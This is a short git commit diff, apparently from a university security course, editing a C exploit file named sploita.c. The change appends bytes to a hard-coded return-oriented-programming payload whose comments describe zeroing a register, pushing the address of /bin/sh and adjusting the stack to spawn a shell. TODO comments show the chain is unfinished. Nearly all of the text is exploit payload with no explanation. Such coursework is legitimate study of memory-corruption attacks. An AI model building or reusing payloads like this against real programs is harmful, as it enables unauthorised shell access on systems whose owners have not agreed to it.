f66472a780594a9e4dd106b04fa62282bebf9628
jonathandorsey1 <jonathandorsey@utexas.edu>
2020-10-24 23:45:54 -0500

    added more

--- sploita.c
+++ sploita.c
@@ -17,7 +17,8 @@ int main(void)
                       "\xD4\xBE\xB3\xBB\xD5\x15\xAC\xBB"//\xCC\x9D\xB8\xBB"//\xD5\x15\xAC\xBB" // 0 out edx then add 4 to esp
                       "\xf6\xf6\xb7\xbb\xCC\x9D\xB8\xBB"//\x09\x09\x09\x09" // addy of /bin/sh and push edx (00000000) 
                       "\x68\x8B\xAA\xBB" // skip params on stack
-                      "\xf6\xf6\xb7\xbb\xc8\x28\xbf\xbf\xcc\x28\xbf\xbf"); // addy of bin/sh addy of y (above) addy of y + 4
+                      "\xf6\xf6\xb7\xbb\xc8\x28\xbf\xbf\xcc\x28\xbf\xbf" // addy of bin/sh addy of y (above) addy of y + 4
+                      "\xE5\xB6\xA9\xBB");
                       // TODO : move stack pointer to addy above, push edx to stack
                       // TODO : add addy of bin/sh to stack followed by addy above
                       // TODO : push edx to stack
